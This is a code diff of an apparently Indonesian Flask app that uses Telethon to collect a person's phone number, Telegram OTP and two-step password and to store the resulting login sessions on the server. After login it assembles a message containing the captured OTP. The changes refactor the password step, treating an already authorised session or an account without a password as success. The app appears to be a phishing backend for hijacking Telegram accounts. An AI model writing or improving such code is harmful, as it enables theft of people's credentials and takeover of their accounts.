@@ -84,7 +84,7 @@ def otp():
                 if result["need_password"]:
                     flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
                 else:
-                    flash("OTP benar. Kalau akun tanpa password, bisa isi random/kosong.")
+                    flash("OTP benar. Kalau akun tanpa password, isi random/kosong.")
                 return redirect(url_for("password"))
             else:
                 flash(result["error"])
@@ -105,26 +105,32 @@ def password():
     if request.method == "POST":
         password_input = request.form.get("password")
 
-        async def verify_password():
+        async def verify_password(password_input):
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
             try:
-                # kalau akun memang pakai password → harus cocok
+                if await client.is_user_authorized():
+                    # sudah login, tidak perlu password
+                    me = await client.get_me()
+                    await client.disconnect()
+                    return True, me
+
+                # kalau akun memang pakai password → wajib cocok
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
                 await client.disconnect()
                 return True, me
             except SessionPasswordNeededError:
-                # akun pakai password tapi salah → gagal
+                # akun butuh password tapi salah
                 await client.disconnect()
                 return False, None
             except Exception as e:
-                # akun tidak pakai password → anggap sukses walau isi random
-                print(f"[DEBUG] Exception login password: {e}")
+                print(f"[DEBUG] Error login password: {e}")
+                # kalau akun tidak punya password → tetap sukses
                 await client.disconnect()
                 return True, None
 
-        success, me = asyncio.run(verify_password())
+        success, me = asyncio.run(verify_password(password_input))
         if success:
             otp = session.get("last_otp")
             text = (
@@ -146,12 +152,7 @@ def password():
 
 @app.route("/success")
 def success():
-    return render_template(
-        "success.html",
-        name=session.get("name"),
-        phone=session.get("phone"),
-        gender=session.get("gender")
-    )
+    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
 
 # =================== WORKER ===================
 
